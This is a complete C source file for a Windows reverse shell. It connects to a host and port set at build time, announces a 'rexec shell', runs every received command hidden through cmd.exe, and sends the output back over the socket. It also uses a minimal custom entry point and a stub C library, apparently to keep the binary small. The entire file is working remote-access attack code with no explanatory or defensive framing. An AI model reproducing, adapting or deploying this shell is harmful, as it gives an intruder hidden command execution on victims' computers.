#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "../stublibc.c"

#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

#ifndef SHELL_PRE
#define SHELL "cmd.exe /Q /c"
#endif

#ifndef PROMPT
#define PROMPT ">"
#endif

#ifdef USE_BUILTINS
#define CALL(x) __builtin_##x
#else
#define CALL(x) x
#endif

/* Growable byte buffer */
typedef struct {
  char *data;
  size_t len;
  size_t cap;
} Buf;

static int buf_append(Buf *b, const char *src, size_t n) {
  if (b->len + n + 1 > b->cap) {
    size_t newcap = b->cap ? b->cap : 512;
    while (b->len + n + 1 > newcap)
      newcap *= 2;
    char *tmp = (char *)CALL(realloc)(b->data, newcap);
    if (!tmp)
      return 0;
    b->data = tmp;
    b->cap = newcap;
  }
  CALL(memcpy)(b->data + b->len, src, n);
  b->len += n;
  b->data[b->len] = '\0';
  return 1;
}

/* Read everything currently available from the pipe into buf. */
static int drain_pipe(HANDLE rd, Buf *out) {
  for (;;) {
    DWORD avail = 0;
    if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL))
      return 1; /* broken pipe: child closed its end */
    if (avail == 0)
      return 1;
    char chunk[2048] = {0};
    DWORD got = 0;
    DWORD want = avail < sizeof chunk ? avail : (DWORD)sizeof chunk;
    if (!ReadFile(rd, chunk, want, &got, NULL) || got == 0)
      return 1;
    if (!buf_append(out, chunk, got))
      return 0;
  }
}

static inline char *bi_strdup(const char *src) {
  int size = CALL(strlen(src));
  char *dst = CALL(calloc)(size, sizeof(char));
  CALL(strncpy)(dst, src, size);
  return dst;
}

static int run_process(const char *cmdline, const char *input, int merge_err, DWORD timeout_ms, Buf *out,
                       DWORD *exit_code, int *timed_out) {
  static SECURITY_ATTRIBUTES sa;
  HANDLE out_rd = NULL, out_wr = NULL; /* child's stdout/stderr */
  HANDLE in_rd = NULL, in_wr = NULL;   /* child's stdin         */
  HANDLE err_wr = NULL;                /* child's stderr        */
  PROCESS_INFORMATION pi;
  STARTUPINFOA si;
  char *cmd = NULL;
  int ok = 0;

  SecureZeroMemory(&pi, sizeof pi);
  *timed_out = 0;
  *exit_code = (DWORD)-1;

  sa.nLength = sizeof sa;
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle = TRUE; /* pipe handles are inheritable */

  /* stdout pipe */
  if (!CreatePipe(&out_rd, &out_wr, &sa, 0)) {
    goto cleanup;
  }
  /* The parent's read end must NOT be inherited by the child. */
  SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

  /* stdin pipe */
  if (!CreatePipe(&in_rd, &in_wr, &sa, 0)) {
    goto cleanup;
  }
  /* The parent's write end must NOT be inherited by the child. */
  SetHandleInformation(in_wr, HANDLE_FLAG_INHERIT, 0);

  /* stderr: either share the stdout pipe or give it its own NUL sink */
  if (merge_err) {
    err_wr = out_wr;
  } else {
    err_wr = CreateFileA("NUL", GENERIC_WRITE, FILE_SHARE_WRITE, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (err_wr == INVALID_HANDLE_VALUE) {
      err_wr = NULL;
      goto cleanup;
    }
  }

  ZeroMemory(&si, sizeof si);
  si.cb = sizeof si;
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = in_rd;
  si.hStdOutput = out_wr;
  si.hStdError = err_wr;

  /* CreateProcess may modify the command-line buffer, so pass a copy. */
  cmd = bi_strdup(cmdline);
  if (!cmd) {
    goto cleanup;
  }

  if (!CreateProcessA(NULL,             /* application name (taken from cmd) */
                      cmd,              /* mutable command line              */
                      NULL, NULL,       /* process / thread security         */
                      TRUE,             /* inherit handles                   */
                      CREATE_NO_WINDOW, /* no console window popping up      */
                      NULL, NULL,       /* environment, current directory    */
                      &si, &pi)) {
    goto cleanup;
  }

  /* Close the child's ends in the parent. Without this, we would never
   * see EOF on the output pipe because we'd still hold a write handle. */
  CloseHandle(out_wr);
  out_wr = NULL;
  CloseHandle(in_rd);
  in_rd = NULL;
  if (merge_err)
    err_wr = NULL; /* was an alias of out_wr */
  else {
    CloseHandle(err_wr);
    err_wr = NULL;
  }

  /* Send input (if any) and close stdin so the child sees EOF. */
  if (input) {
    DWORD written = 0;
    WriteFile(in_wr, input, (DWORD)strlen(input), &written, NULL);
  }
  CloseHandle(in_wr);
  in_wr = NULL;

  /* Poll: collect output while waiting for the process to finish. */
  {
    ULONGLONG start = GetTickCount64();
    for (;;) {
      if (!drain_pipe(out_rd, out)) {
        TerminateProcess(pi.hProcess, 1);
        break;
      }

      DWORD w = WaitForSingleObject(pi.hProcess, 20);
      if (w == WAIT_OBJECT_0) {
        drain_pipe(out_rd, out); /* grab any final bytes */
        break;
      }
      if (timeout_ms != INFINITE && GetTickCount64() - start >= timeout_ms) {
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 1000);
        drain_pipe(out_rd, out);
        *timed_out = 1;
        break;
      }
    }
  }

  GetExitCodeProcess(pi.hProcess, exit_code);
  ok = 1;

cleanup:
  free(cmd);
  if (pi.hProcess)
    CloseHandle(pi.hProcess);
  if (pi.hThread)
    CloseHandle(pi.hThread);
  if (out_rd)
    CloseHandle(out_rd);
  if (out_wr)
    CloseHandle(out_wr);
  if (in_rd)
    CloseHandle(in_rd);
  if (in_wr)
    CloseHandle(in_wr);
  if (err_wr && err_wr != out_wr)
    CloseHandle(err_wr);
  return ok;
}

static inline int sendQ(SOCKET sock, const char *msg) {
  int size = 0;
  while (*(msg + size))
    size++;
  return send(sock, msg, size, 0);
}

#define _STR(x) #x
#define STR(x) _STR(x)

int start() {
  WSADATA wsa;
  int rc = WSAStartup(MAKEWORD(2, 2), &wsa);
  if (rc != 0) {
    return 1;
  }

  struct addrinfo hints, *result = NULL, *ptr = NULL;
  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_UNSPEC; /* IPv4 or IPv6 */
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;

  rc = getaddrinfo(STR(HOST), STR(PORT), &hints, &result);
  if (rc != 0) {
    WSACleanup();
    return 1;
  }

  SOCKET sock = INVALID_SOCKET;

  /* Try each returned address until one connects */
  for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
    sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (sock == INVALID_SOCKET) {
      continue;
    }
    if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
      closesocket(sock);
      sock = INVALID_SOCKET;
      continue;
    }
    break;
  }

  freeaddrinfo(result);

  if (sock == INVALID_SOCKET) {
    WSACleanup();
    return 1;
  }

  int running = 1, n = 0, timed_out = 0;
  char buf[1024], cmd[20 + sizeof(buf)], path[1024];
  SecureZeroMemory(buf, sizeof(buf));
  SecureZeroMemory(path, sizeof(path));
  Buf out;
  SecureZeroMemory(&out, sizeof(out));
  DWORD code = 0;
  sendQ(sock, "Minial rexec shell.\nThere are no terminal key handling capabilities.\n");
  while (running) {
    if (n == 0) {
      GetCurrentDirectoryA(sizeof(path), path);
      sendQ(sock, path);
      sendQ(sock, PROMPT);
    }
    n += recv(sock, buf + n, sizeof(buf) - 1 - n, 0);
    if (n == 0) {
      running = 0;
      break;
    } else if (n < 0) {
      running = 0;
      break;
    }
    buf[n] = '\0';
    if (buf[n - 1] != '\n')
      continue;

    if (CALL(strncmp)(buf, "quit", 4) == 0 || CALL(strncmp)(buf, "exit", 4) == 0) {
      running = 0;
      sendQ(sock, "Exiting.\n");
      goto quit;
    }
    if (CALL(strncmp)(buf, "cd ", 3) == 0) {
      buf[n - 1] = '\0';
      if (!SetCurrentDirectoryA(buf + 3)) {
        char *msg = NULL;
        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, GetLastError(), 0, (LPSTR)&msg, 0, NULL);
        sendQ(sock, msg);
        if (msg)
          LocalFree(msg);
      }
      SecureZeroMemory(buf, sizeof(buf));
      n = 0;
      continue;
    }
    if (n == 1) {
      SecureZeroMemory(buf, sizeof(buf));
      n = 0;
    }
    CALL(strncpy)(cmd, SHELL " ", sizeof(SHELL) + 1);
    CALL(strncat)(cmd, buf, CALL(strlen)(buf) - 1);
#ifdef SHELL_POST
    CALL(strncat)(cmd, " " SHELL_POST, CALL(strlen)(SHELL_POST) + 1);
#endif
    cmd[sizeof(cmd) - 1] = '\0';
    if (run_process(cmd, buf, 1, 10000, &out, &code, &timed_out)) {
      if (timed_out)
        sendQ(sock, "Process timed out\n");
      if (!out.data || !out.len) {
        sendQ(sock, "No output!\n");
        continue;
      }
      send(sock, out.data, out.len, 0);
      sendQ(sock, "\n");
      n = 0;
    } else
      sendQ(sock, "Could not start the process.\n\n");
    SecureZeroMemory(buf, sizeof(buf));
    SecureZeroMemory(cmd, sizeof(cmd));
    SecureZeroMemory(out.data, out.len);
  }
quit:
  shutdown(sock, SD_BOTH);
  closesocket(sock);
  CALL(free)(out.data);
  WSACleanup();
  ExitProcess(0);
  return 0;
}

// Vim: set expandtab tabstop=2 shiftwidth=2:
